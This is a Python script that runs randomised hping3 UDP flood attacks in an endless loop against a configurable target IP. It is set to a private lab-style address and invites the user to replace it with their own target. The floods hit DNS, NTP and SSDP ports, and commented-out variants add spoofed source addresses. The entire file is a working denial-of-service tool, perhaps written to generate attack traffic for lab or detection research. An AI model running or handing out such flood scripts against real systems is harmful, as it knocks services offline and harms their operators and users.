import subprocess
import random
import time
import os

TARGET_IP = "172.30.0.2"  # Replace with your target IP
print(f"Starting UDP Attacks on {TARGET_IP}...")

UDP_ATTACKS = [
    f"hping3 --udp --flood -p 53 {TARGET_IP}",
    f"hping3 --udp --flood -p 123 {TARGET_IP}",
    f"hping3 --udp --flood -p 1900 {TARGET_IP}",
    f"hping3 --udp --flood -p 53 {TARGET_IP} -d 512",
    f"hping3 -S --udp --icmp --flood {TARGET_IP}",
    
    # f"hping3 --udp --flood -p {random.randint(1, 65535)} -d {random.randint(100, 600)} {TARGET_IP}",  # UDP payload attack
    
    # f"hping3 --udp --flood -p 53 --rand-source {TARGET_IP}",
    # f"hping3 --udp --flood -p 123 --rand-source {TARGET_IP}",
    # f"hping3 --udp --flood -p 1900 --rand-source {TARGET_IP}",
    # f"hping3 --udp --flood -p 53 --rand-source {TARGET_IP} -d 512",
]

while True:
    sleep_intervals = [random.randint(5, 15), random.randint(15, 60), random.randint(60, 90)]
    random_sleep = random.choice(sleep_intervals)
    random_index = random.randint(0, len(UDP_ATTACKS) - 1)

    print(f"Executing: {UDP_ATTACKS[random_index]} for {random_sleep} seconds...")

    process = subprocess.Popen(UDP_ATTACKS[random_index], shell=True)
    
    time.sleep(random_sleep)
    process.terminate()
    process.wait()
    
    os.system("killall hping3")
    
    time.sleep(8)
